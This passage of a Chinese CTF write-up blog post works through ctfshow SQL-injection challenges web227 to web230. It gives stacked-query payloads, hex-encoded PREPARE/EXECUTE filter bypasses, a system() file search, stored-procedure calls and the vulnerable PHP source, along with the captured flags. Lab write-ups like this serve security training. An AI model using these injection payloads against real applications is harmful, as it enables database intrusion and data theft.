<span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ret</span>[<span class="hljs-string">'data'</span>], <span class="hljs-variable">$row</span>);<br>}<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>config.php</p>
<figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$d</span>bhost =<span class="hljs-string">"127.0.0.1"</span>;<br><span class="hljs-symbol">$d</span>buser = <span class="hljs-string">"root"</span>;<br><span class="hljs-symbol">$d</span>bpwd = <span class="hljs-string">"root"</span>;<br><span class="hljs-symbol">$d</span>bname = <span class="hljs-string">"ctfshow_web"</span>;<br><span class="hljs-symbol">$c</span>harName = <span class="hljs-string">"utf-8"</span>; <br></code></pre></td></tr></tbody></table></figure>

<p>逛了一圈没有看到flag</p>
<figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1</span>=system(<span class="hljs-string">'find / -name "*flag*"'</span>);<br><span class="hljs-regexp">/tmp/</span>flag.sh <br></code></pre></td></tr></tbody></table></figure>

<p>看到这个脚本文件</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">sed -i "s/flag_here/$FLAG/" /var/www/html/db.sql<br>mysql -e "<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> ctftraining; <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> ctfshow_web;USE ctfshow_web;<span class="hljs-keyword">CREATE</span> TABLE <span class="hljs-symbol">`ctfshow_user`</span> (<span class="hljs-symbol">`id`</span> int(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> AUTO_INCREMENT,<span class="hljs-symbol">`username`</span> varchar(<span class="hljs-number">255</span>) DEFAULT <span class="hljs-literal">NULL</span>,<span class="hljs-symbol">`pass`</span> varchar(<span class="hljs-number">255</span>) DEFAULT <span class="hljs-literal">NULL</span>,<span class="hljs-keyword">PRIMARY</span> <span class="hljs-keyword">KEY</span> (<span class="hljs-symbol">`id`</span>)) ENGINE=InnoDB AUTO_INCREMENT=<span class="hljs-number">26</span> DEFAULT CHARSET=utf8;" -uroot -proot<br>export FLAG=not_flag<br>FLAG=not_flag<br></code></pre></td></tr></tbody></table></figure>

<p>第三行代码将环境变量中的flag置换为not_flag，因此去mysql的存储过程中去找flag</p>
<p>PY:</p>
<figure class="highlight q"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs q">username=';prepare p <span class="hljs-keyword">from</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> information_schema.routines;execute p;<br><br>{<span class="hljs-string">"code"</span>:<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u6210\u529f"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"data"</span>:[{<span class="hljs-string">"SPECIFIC_NAME"</span>:<span class="hljs-string">"getFlag"</span>,<span class="hljs-string">"ROUTINE_CATALOG"</span>:<span class="hljs-string">"def"</span>,<span class="hljs-string">"ROUTINE_SCHEMA"</span>:<span class="hljs-string">"ctfshow_web"</span>,<span class="hljs-string">"ROUTINE_NAME"</span>:<span class="hljs-string">"getFlag"</span>,<span class="hljs-string">"ROUTINE_TYPE"</span>:<span class="hljs-string">"PROCEDURE"</span>,<span class="hljs-string">"DATA_TYPE"</span>:<span class="hljs-string">""</span>,<span class="hljs-string">"CHARACTER_MAXIMUM_LENGTH"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"CHARACTER_OCTET_LENGTH"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"NUMERIC_PRECISION"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"NUMERIC_SCALE"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"DATETIME_PRECISION"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"CHARACTER_SET_NAME"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"COLLATION_NAME"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"DTD_IDENTIFIER"</span>:<span class="hljs-built_in">null</span>,<span class="hljs-string">"ROUTINE_BODY"</span>:<span class="hljs-string">"SQL"</span>,<span class="hljs-string">"ROUTINE_DEFINITION"</span>:<span class="hljs-string">"BEGIN\n\tSELECT \</span><br><span class="hljs-string">"</span>ctfshow{<span class="hljs-number">1</span>eaecd42<span class="hljs-number">-233</span>c<span class="hljs-number">-47</span>fd-b8f5<span class="hljs-number">-8</span>aaae7b677a5}\<span class="hljs-string">";</span><br></code></pre></td></tr></tbody></table></figure>

<p>在上面可以看到flag,也可以再调用存储过程</p>
<figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">username=';<span class="hljs-keyword">call</span> getFlag();<br></code></pre></td></tr></tbody></table></figure>

<h3 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$banlist</span>)&gt;<span class="hljs-number">0</span>){<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$banlist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) {<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/"</span>.<span class="hljs-variable">$char</span>.<span class="hljs-string">"/i"</span>, <span class="hljs-variable">$username</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>      }<br>    }<br>  }<br></code></pre></td></tr></tbody></table></figure>

<p>16进制即可绕过：</p>
<figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">username=user1';PREPARE+flag+from+0x<span class="hljs-number">7365</span>6c<span class="hljs-number">65637420</span>2a<span class="hljs-number">206672</span>6f6d<span class="hljs-number">206374667368</span>5f6f775f666c<span class="hljs-number">616761736161</span>;EXECUTE+flag;--%0a<br></code></pre></td></tr></tbody></table></figure>

<h4 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h4><p>预处理查表：</p>
<figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">username=user1';PREPARE+flag+from+0x<span class="hljs-number">7368</span>6f<span class="hljs-number">7720746162</span>6c<span class="hljs-number">6573</span>;EXECUTE+flag;--%0a<br></code></pre></td></tr></tbody></table></figure>

<p>查数据：</p>
<figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">PREPARE+flag+from<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">73656</span><span class="hljs-keyword">c</span><span class="hljs-number">656374202</span>a<span class="hljs-number">2066726</span>f<span class="hljs-number">6</span>d<span class="hljs-number">20666</span><span class="hljs-keyword">c</span><span class="hljs-number">6167</span><span class="hljs-comment">;EXECUTE+flag;--%0a</span><br></code></pre></td></tr></tbody></table></figure>

<p>其他：查询账户</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span><span class="hljs-operator">+</span>flag<span class="hljs-operator">+</span><span class="hljs-keyword">from</span><span class="hljs-operator">+</span><span class="hljs-number">0x73656c656374207573657228293b</span>;<span class="hljs-keyword">EXECUTE</span><span class="hljs-operator">+</span>flag;<br><span class="hljs-keyword">user</span>()":"root<span class="hljs-variable">@localhost</span>"<br></code></pre></td></tr></tbody></table></figure>

<p>查看环境变量：</p>
<figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">PREPARE+flag+from<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">73686</span>f<span class="hljs-number">7720676</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>f<span class="hljs-number">62616</span><span class="hljs-keyword">c</span><span class="hljs-number">207661726961626</span><span class="hljs-keyword">c</span><span class="hljs-number">6573206</span><span class="hljs-keyword">c</span><span class="hljs-number">696</span>b<span class="hljs-number">652027257365637572655</span>f<span class="hljs-number">66696</span><span class="hljs-keyword">c</span><span class="hljs-number">655</span>f<span class="hljs-number">7072697625273</span>b<span class="hljs-comment">;EXECUTE+flag;--%0a</span><br><br><span class="hljs-string">"secure_file_priv"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"Value"</span>:<span class="hljs-string">""</span><br></code></pre></td></tr></tbody></table></figure>

<p>说明是可以写文件的，但是写文件总是失败，可以读取文件：/var/www/html/api/index.php</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-11-01 14:21:03</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-11-17 02:29:43</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">"config.php"</span>;<br><br><span class="hljs-variable">$ua</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_USER_AGENT'</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/sqlmap/i'</span>, <span class="hljs-variable">$ua</span>)){<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">"使用sqlmap是没有灵魂的"</span>)));<br>}<br><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'username'</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$id</span>)){<br>    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpwd</span>, <span class="hljs-variable">$dbname</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>()){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>    }<br><br>    <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"set name <span class="hljs-subst">$charName</span>"</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">"code"</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"查询失败"</span>,<br>        <span class="hljs-string">"count"</span> =&gt; <span class="hljs-variable">$num</span>,<br>        <span class="hljs-string">"data"</span> =&gt; <span class="hljs-keyword">array</span>()<br>    );<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|show|,|open/i'</span>, <span class="hljs-variable">$id</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>    }<br><br>    <span class="hljs-variable">$banlist</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select char from banlist;"</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>)){<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$banlist</span>, <span class="hljs-variable">$row</span>);<br>    }<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$banlist</span>) &gt; <span class="hljs-number">0</span>){<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$banlist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) {<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/'</span>.<span class="hljs-variable">$char</span>.<span class="hljs-string">'/i'</span>, <span class="hljs-variable">$id</span>)){<br>                <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>            }<br>        }<br>    }<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select id, username, pass from ctfshow_user where username = '<span class="hljs-subst">{$id}</span>';"</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)){<br>        <span class="hljs-keyword">do</span> {<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_store_result</span>(<span class="hljs-variable">$conn</span>)){<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_object</span>(<span class="hljs-variable">$result</span>)) {<br>                    <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>] = <span class="hljs-string">'查询成功'</span>;<br>                    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ret</span>[<span class="hljs-string">'data'</span>], <span class="hljs-variable">$row</span>);<br>                }<br>                <span class="hljs-title function_ invoke__">mysqli_free_result</span>(<span class="hljs-variable">$result</span>);<br>            }<br>        } <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">mysqli_next_result</span>(<span class="hljs-variable">$conn</span>));<br>    }<br><br>    <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br>} <span class="hljs-keyword">else</span> {<br>    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpwd</span>, <span class="hljs-variable">$dbname</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>()){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())));<br>    }<br><br>    <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"set name <span class="hljs-subst">$charName</span>"</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select count(username) as num from ctfshow_user;"</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_object</span>()-&gt;num;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">"code"</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">"msg"</span> =&gt; <span class="hljs-string">"查询失败"</span>,<br>        <span class="hljs-string">"count"</span> =&gt; <span class="hljs-variable">$num</span>,<br>        <span class="hljs-string">"data"</span> =&gt; <span class="hljs-keyword">array</span>()<br>    );<br><br>    <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>]);<br>    <span class="hljs-variable">$limit</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'limit'</span>]);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/file|into|dump/i'</span>, <span class="hljs-variable">$limit</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>    }<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from ctfshow_user limit "</span>.<span class="hljs-title function_ invoke__">intval</span>((<span class="hljs-variable">$page</span>-<span class="hljs-number">1</span>)*<span class="hljs-variable">$limit</span>).<span class="hljs-string">","</span>.<span class="hljs-variable">$limit</span>.<span class="hljs-string">";"</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_object</span>()){<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>] = <span class="hljs-string">'查询成功'</span>;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ret</span>[<span class="hljs-string">'data'</span>], <span class="hljs-variable">$row</span>);<br>    }<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br>}<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>

<h4 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h4><p>查表：</p>
<figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">username=user1';PREPARE+flag+from+0x<span class="hljs-number">7368</span>6f<span class="hljs-number">7720746162</span>6c<span class="hljs-number">6573</span>;EXECUTE+flag;--%0a<br></code></pre></td></tr></tbody></table></figure>

<p>查数据：</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> * from flagaabbx;<br><br><span class="hljs-attribute">ctfshow</span>{<span class="hljs-number">5</span>bd91e63-<span class="hljs-number">8508</span>-<span class="hljs-number">4</span>b6a-<span class="hljs-number">8904</span>-<span class="hljs-number">273</span>f83b2541a}<br></code></pre></td></tr></tbody></table></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/ctf-show/">#ctf_show</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>SQL注入</div>
      <div>https://blog.dbii.top/posts/e73517db/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>MiFuzz</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年3月16日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2024年3月16日</div>
        </div>
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
                    <i class="iconfont icon-nc"></i>
                  </span>
                </a>
              
                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
                  <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
                    <i class="iconfont icon-nd"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/posts/44659fec/" title="PHP特性">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">PHP特性</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/posts/31915a1e/" title="文件包含">
                        <span class="hidden-mobile">文件包含</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a>© 2023  </a> <i class="iconfont icon-love"></i> <a href="https://blog.dbii.top/about" target="_blank" rel="nofollow noopener"><span>MiFuzz</span></a> </br> <a>最难开口的事情就是 初次的问好 和最终的道别</a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>





  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


